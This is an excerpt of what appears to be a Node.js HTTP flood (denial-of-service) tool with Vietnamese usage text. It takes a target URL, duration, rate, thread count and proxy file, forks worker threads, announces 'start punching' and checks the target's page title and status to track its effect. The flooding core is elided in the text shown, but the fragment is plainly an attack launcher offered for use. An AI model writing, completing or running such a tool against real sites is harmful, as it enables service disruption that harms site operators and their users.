...
HuongDan: node http.js link time rate thread proxyfile
ViDu: node http.js https://target.com 120 32 8 proxy.txt
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [Shiroko]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [Shiroko]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [Shiroko]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [Shiroko]  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [Shiroko]  Chuẩn Bị Luồng ${i} Sẵn Sàng`);
  }
  console.log(`${getCurrentTime()} [Shiroko]  Bắt Đầu Đấm`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [Shiroko]  Đã Ngừng Đấm`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
